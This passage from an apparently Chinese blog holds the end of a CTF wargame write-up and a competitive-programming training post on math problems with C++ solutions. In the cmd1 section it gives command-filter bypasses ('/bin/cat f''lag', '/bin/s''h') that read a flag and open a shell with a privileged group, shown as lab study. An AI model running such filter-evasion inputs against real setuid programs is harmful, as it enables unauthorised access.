class="number">20</span>);</div><div class="line"></div><div class="line"><span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</div><div class="line"><span class="keyword">int</span> len;</div><div class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>显然两个<code>if</code>处都有优先级的问题，会先进行&lt;&gt;的运算再进行赋值，所以在文件存在的情况下fd一定等于0，也就是一定从stdin读入。根据后面的逻辑，即输入两个串使得第一个串异或1之后等于第二个串就可以了，例如<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0123456789</div><div class="line">1032547698</div></pre></td></tr></table></figure></p><h3 id="0x0d-cmd1"><a href="#0x0d-cmd1" class="headerlink" title="0x0d cmd1"></a>0x0d cmd1</h3><p>整个程序先putenv设置环境变量，然后filter过滤，最后由system函数执行。<br>虽然设置了环境变量，但只要使用绝对路径一样可以调用。<br>至于过滤也很好绕过。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./cmd1 <span class="string">"/bin/cat f''lag"</span> <span class="comment"># 加分隔符</span></div><div class="line">./cmd1 <span class="string">"/bin/cat f*"</span> <span class="comment"># 用通配符</span></div></pre></td></tr></table></figure></p><p>同理其实也可以进入cmd1_pwn组的shell<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./cmd1 <span class="string">"/bin/s''h"</span> <span class="comment"># 加分隔符</span></div></pre></td></tr></table></figure></p><h3 id="0x13-blukat"><a href="#0x13-blukat" class="headerlink" title="0x13 blukat"></a>0x13 blukat</h3><p>描述非常神奇的一道题，做法也很神奇。<br>登录上去以后看了一下代码，需要输入一个串使得跟password相等<br>查看一下权限，跟其他的题是一样的<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">blukat@ubuntu:~$ ls -alh</div><div class="line">total 36K</div><div class="line">drwxr-x---  4 root blukat     4.0K Aug 15 22:55 .</div><div class="line">drwxr-xr-x 93 root root       4.0K Oct 10 22:56 ..</div><div class="line">dr-xr-xr-x  2 root root       4.0K Aug 15 22:55 .irssi</div><div class="line">drwxr-xr-x  2 root root       4.0K Aug 15 22:55 .pwntools-cache</div><div class="line">-r-xr-sr-x  1 root blukat_pwn 9.0K Aug  8 06:44 blukat</div><div class="line">-rw-r--r--  1 root root        645 Aug  8 06:43 blukat.c</div><div class="line">-rw-r-----  1 root blukat_pwn   33 Jan  6  2017 password</div></pre></td></tr></table></figure></p><p>尝试一下查看password<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">blukat@ubuntu:~$ cat password</div><div class="line">cat: password: Permission denied</div></pre></td></tr></table></figure></p><p>看上去就像个权限不够的提示，但是实际上用more/less/vim就会发现问题。。。<br>其实这句话就是password文件的全部内容。。。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">blukat@ubuntu:~$ id</div><div class="line">uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)</div></pre></td></tr></table></figure></p><p><em>NOTE: 这个题目告诉我们当前的身份很重要，包括group权限！</em></p>]]></content>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HHUACM 暑假专题 数学</title>
      <url>/blog/2018/09/02/hhutraining4/</url>
      <content type="html"><![CDATA[<h3 id="A-求递推序列的第N项"><a href="#A-求递推序列的第N项" class="headerlink" title="A - 求递推序列的第N项"></a><a href="https://vjudge.net/problem/51Nod-1126" target="_blank" rel="noopener">A - 求递推序列的第N项</a></h3><p>矩阵快速幂，帮助大家搭建/测试自己的模板。<br>简单地讲一下原理，可以看到每一项用到了前两项的值，首先构造一个二维的向量$\left(\begin{matrix}<br>f(i-1) \\<br>f(i-2) \\<br>\end{matrix}\right)$，如果有常数就再加一维。那么将这个向量作为自变量，下一项就是$\left(\begin{matrix}<br>f(i) \\<br>f(i-1) \\<br>\end{matrix}\right)$。最后稍微动一下脑子配一个$2\times2$的系数矩阵使得$Cx_{i-1}=x_{i}$：<br>$$\left(\begin{matrix}<br>A &amp; B \\<br>1 &amp; 0 \\<br>\end{matrix}\right)<br>\left(\begin{matrix}<br>f(i-1) \\<br>f(i-2) \\<br>\end{matrix}\right)<br>=\left(\begin{matrix}<br>f(i) \\<br>f(i-1) \\<br>\end{matrix}\right)$$<br>复杂度$O(M^3logN)$，其中$M$为矩阵的大小，等于$2$。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MO=<span class="number">7</span>;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> Matrix &#123;</div><div class="line">    <span class="keyword">int</span> r,c;</div><div class="line">    ll e[<span class="number">2</span>][<span class="number">2</span>];</div><div class="line">    Matrix() &#123;&#125;</div><div class="line">    Matrix(<span class="keyword">int</span> _r,<span class="keyword">int</span> _c) &#123;</div><div class="line">        r=_r;c=_c;</div><div class="line">        <span class="built_in">memset</span>(e,<span class="number">0</span>,<span class="keyword">sizeof</span>(e));</div><div class="line">    &#125;</div><div class="line">    Matrix(ll x) &#123;</div><div class="line">        r=c=<span class="number">2</span>;</div><div class="line">        <span class="built_in">memset</span>(e,<span class="number">0</span>,<span class="keyword">sizeof</span>(e));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r;i++) &#123;</div><div class="line">            e[i][i]=x;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    Matrix <span class="keyword">operator</span> *(<span class="keyword">const</span> Matrix &amp;b) &#123;</div><div class="line">        <span class="function">Matrix <span class="title">C</span><span class="params">(r,b.c)</span></span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;b.c;j++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;c;k++) &#123;</div><div class="line">                    C.e[i][j]+=e[i][k]*b.e[k][j]%MO;</div><div class="line">                    <span class="keyword">if</span> (C.e[i][j]&gt;=MO) C.e[i][j]%=MO;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> C;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function">Matrix <span class="title">fpow</span><span class="params">(Matrix x,ll n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function">Matrix <span class="title">res</span><span class="params">(<span class="number">1</span>)</span></span>;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        <span class="keyword">if</span> (n&amp;<span class="number">1</span>) &#123;</div><div class="line">            res=res*x;</div><div class="line">        &#125;</div><div class="line">        x=x*x;</div><div class="line">        n&gt;&gt;=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a,b,n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;a,&amp;b,&amp;n);</div><div class="line">    <span class="keyword">if</span> (n&lt;=<span class="number">2</span>) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"1"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        Matrix A(<span class="number">2</span>,<span class="number">2</span>);</div><div class="line">        A.e[<span class="number">0</span>][<span class="number">0</span>]=a;</div><div class="line">        A.e[<span class="number">0</span>][<span class="number">1</span>]=b;</div><div class="line">        A.e[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        A.e[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">0</span>;</div><div class="line">        <span class="function">Matrix <span class="title">X</span><span class="params">(<span class="number">2</span>,<span class="number">1</span>)</span></span>;</div><div class="line">        X.e[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        X.e[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        A=fpow(A,n<span class="number">-2</span>);</div><div class="line">        X=A*X;</div><div class="line">        <span class="keyword">int</span> ans=(X.e[<span class="number">0</span>][<span class="number">0</span>]%MO+MO)%MO;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="B-Kinds-of-Fuwas"><a href="#B-Kinds-of-Fuwas" class="headerlink" title="B - Kinds of Fuwas"></a><a href="https://vjudge.net/problem/ZOJ-2975" target="_blank" rel="noopener">B - Kinds of Fuwas</a></h3><p>题意：四个角为同一种福娃的子矩形有多少个？<br>题解：从样例可以看出，一行或一列的矩形都不算。从数据范围来看，直接四个循环复杂度太高了，但是每个元素的值域很小，只有五个种类，所以可以考虑枚举每个种类来做。对于每个种类，比如<code>H</code>，我们可以利用类似最大子矩阵的套路，枚举两行作为上下界，然后再枚举每一列，对上下都是<code>H</code>的列进行计数，在这之中任取两列就是符合要求的矩形，所以把答案加上$C^{2}_{m}$即可，这个组合数可以$O(1)$求得。<br>复杂度$(KM^2N)$，其中$K$等于$5$。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> PP[<span class="number">9</span>]=<span class="string">"BJHYN"</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">256</span>;</div><div class="line"><span class="keyword">char</span> mp[N][N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n,m;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,mp[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> p=<span class="number">0</span>;p&lt;<span class="number">5</span>;p++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++) &#123;</div><div class="line">                    <span class="keyword">int</span> t=<span class="number">0</span>;</div><div class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;m;k++) &#123;</div><div class="line">                        <span class="keyword">if</span> (mp[i][k]==PP[p]&amp;&amp;mp[j][k]==PP[p]) ++t;</div><div class="line">                    &#125;</div><div class="line">                    ans+=t*(t<span class="number">-1</span>)/<span class="number">2</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="C-GCD-is-Funny"><a href="#C-GCD-is-Funny" class="headerlink" title="C - GCD is Funny"></a><a href="https://vjudge.net/problem/HDU-5902" target="_blank" rel="noopener">C - GCD is Funny</a></h3><p>题意：<br>在黑板上写有$n$个数，每次删掉$a,b,c$三个数并把$d$写两遍，$d$可以是$(a,b),(a,c),(b,c)$。在$n-2$次操作后会留下两个相同的数，输出这个数的所有可能情况。</p><p>题解：<br>这个题很难<del>虽然出在某一场BC的A题</del>。<br>首先要思考一下脱离具体过程，这个数到底是什么。题中的过程以下简称为“擦黑板”。</p><ol><li>如果已经存在两个相同的数$x$，再取一个数$y$进行一次擦黑板，那么可以令$d=(x,x)=x$，剩下的数为$x,x$。可以发现$y$没有产生影响，两个$x$直接“吃掉”了$y$；</li><li>由1，我们可以单独考虑每一个$size\ge 3$的子集，它的结果一定是两个相同的数，其他的数直接吃掉就好。为了保证枚举的不重不漏，该子集内应该有尽量多的数参与$gcd$运算（注意，参与擦黑板$\neq$参与$gcd$运算），也就是$size-1$个数。因为第一次擦黑板一定有一个数无法参与$gcd$运算，而从第二次开始，有前一次得到的两个数$x$，再取一个数$y$进行一次擦黑板，那么可以令$d=(x,y)$，$y$一定能参与$gcd$运算。</li></ol><p>综上，最后留在黑板上的数其实是任意一个$2\le size \le n-1$的子集的所有数的$gcd$。</p><p>接着再思考一下怎么巧妙地求出这些数，因为暴力枚举子集肯定是不行的。<br>首先注意到$a_i$的值域只有$1000$，而且$gcd$运算只会变小，所以这实际上也是答案的值域。<br>其次$gcd$有一个更强的性质，两个不一样的数取$gcd$，最大也只能是大数的一半。（为什么？）<br>所以我们写一个比较暴力的方法也能保证复杂度，最后要注意的一点就是不要取到全集，具体可以看代码。<br>复杂度$O(n^2+nV\cdot min(log(V),n-3))$，$V$为$a_i$的值域。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">1000</span>;</div><div class="line"><span class="keyword">int</span> a[<span class="number">510</span>];</div><div class="line"><span class="keyword">bool</span> b[MAX+<span class="number">5</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++) &#123;</div><div class="line">                b[__gcd(a[i],a[j])]=<span class="literal">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> num=<span class="number">2</span>;</div><div class="line">        <span class="keyword">bool</span> flag=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">while</span> (++num&lt;n &amp;&amp; flag) &#123;</div><div class="line">            flag=<span class="literal">false</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=MAX;i++) &#123;</div><div class="line">                <span class="keyword">if</span> (b[i]) &#123;</div><div class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++) &#123;</div><div class="line">                        <span class="keyword">int</span> y=__gcd(i,a[j]);</div><div class="line">                        <span class="keyword">if</span> (!b[y]) &#123;</div><div class="line">                            b[y]=<span class="literal">true</span>;</div><div class="line">                            flag=<span class="literal">true</span>;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">bool</span> fi=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (b[i]) &#123;</div><div class="line">                <span class="keyword">if</span> (fi) &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</div><div class="line">                    fi=<span class="literal">false</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">" %d"</span>,i);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="D-Ant"><a href="#D-Ant" class="headerlink" title="D - Ant"></a><a href="https://vjudge.net/problem/ZOJ-3903" target="_blank" rel="noopener">D - Ant</a></h3><p>题意：蚂蚁在一个长方体表面从起点爬到对角点的最短长度设为$L$，问所有最长边是$n$的长方体的$L^2$之和。<br>题解：出这题主要是想让大家牢记三个求和公式。<br>$$ \sum_{i=1}^{n}{i} = \frac{n(n+1)}{2} \\<br> \sum_{i=1}^{n}{i^2} = \frac{n(n+1)(2n+1)}{6} \\<br> \sum_{i=1}^{n}{i^3} = (\sum_{i=1}^{n}{i})^2 = \frac{n^2(n+1)^2}{4} $$<br>在表面上的路径实际上就是三种展开，所以$L^2=\min\{(x+y)^2+n^2,(n+x)^2+y^2,(n+y)^2+x^2\}$，因为在这个式子中$x+y+n$为定值，那么自然是两个数越接近越小，又有$x,y\le n$，所以$L^2=(x+y)^2+n^2$。<br>$$\begin{equation}\begin{split}<br>Ans &amp;= \sum_{x=1}^{n}{\sum_{y=1}^{x}{(x+y)^2+n^2}} \\<br> &amp;= \sum_{x=1}^{n}{x^3+n^2x+x^2(x+1)+\frac{x(x+1)(2x+1)}{6}} \\<br> &amp;= \sum_{x=1}^{n}{\frac{7}{3}x^3+\frac{3}{2}x^2+(\frac{1}{6}+n^2)x} \\<br> &amp;= \frac{7}{3}\frac{n^2(n+1)^2}{4}+\frac{3}{2}\frac{n(n+1)(2n+1)}{6}+(\frac{1}{6}+n^2)\frac{n(n+1)}{2} \\<br> &amp;= \frac{1}{12}(13n^4+26n^3+17n^2+4n)<br>\end{split}\end{equation}$$<br>然后就是求个逆元乘一乘模一模就行了。<br>复杂度$O(1)$。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">using</span> ll = <span class="keyword">long</span> <span class="keyword">long</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MO=<span class="number">1000000007</span>;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">fpow</span><span class="params">(ll x,ll n)</span></span></div><div class="line">&#123;</div><div class="line">    ll res=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (;n;n&gt;&gt;=<span class="number">1</span>,x=x*x%MO) &#123;</div><div class="line">        <span class="keyword">if</span> (n&amp;<span class="number">1</span>) res=res*x%MO;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ll INV12=fpow(<span class="number">12</span>,MO<span class="number">-2</span>);</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        ll n;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;n);</div><div class="line">        n%=MO;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,n*(<span class="number">4</span>+n*(<span class="number">17</span>+n*(<span class="number">26</span>+n*<span class="number">13</span>%MO)%MO)%MO)%MO*INV12%MO);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="E-RPG的错排"><a href="#E-RPG的错排" class="headerlink" title="E - RPG的错排"></a><a href="https://vjudge.net/problem/HDU-2068" target="_blank" rel="noopener">E - RPG的错排</a></h3><p>首先预处理错排数和组合数，然后枚举一下猜错了多少人。<br>单组复杂度$O(n)$。<br>错排数的通项和递推式请参阅其他资料。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">26</span>;</div><div class="line">ll cp[N],C[N][N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    cp[<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;N/<span class="number">2</span>;i++) &#123;</div><div class="line">        cp[i]=(cp[i<span class="number">-2</span>]+cp[i<span class="number">-1</span>])*(i<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++) &#123;</div><div class="line">        C[i][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</div><div class="line">            C[i][j]=C[i<span class="number">-1</span>][j<span class="number">-1</span>]+C[i<span class="number">-1</span>][j];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF&amp;&amp;n) &#123;</div><div class="line">        ll ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n/<span class="number">2</span>;i++) &#123;</div><div class="line">            ans+=C[n][i]*cp[i];</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="F-Dertouzos"><a href="#F-Dertouzos" class="headerlink" title="F - Dertouzos"></a><a href="https://vjudge.net/problem/HDU-5750" target="_blank" rel="noopener">F - Dertouzos</a></h3><p>题意：$n$的真因子是不为$n$的因子。给出$n$和$d$，问有多少小于$n$的数的最大真因子是$d$。<br>题解：即$pd=m\lt n$，显然有</p><ol><li>$p \le \frac{n-1}{d}$；</li><li>$p$必须为质数；(如若不然，则$p$有真因子$q$，$qd$是比$d$更大的$m$的真因子。)</li><li>$p \le c$，其中$c$为$d$的最小质因子。(如若不然，则$\frac{d}{c}\times p$是比$d$更大的$m$的真因子。)</li></ol><p>由2，我们先做一遍筛法以及前缀和。再算出1的界，最后用筛出来的质数去算3的界。</p><p>注意点：用筛出来的质数去算3的界会有$O(\sqrt{d})$的复杂度，当$d$一直很大($\approx 10^{9}$)时会超时，而此时1的界必然比较小，应该<strong>在超过已有的界时及时退出</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div 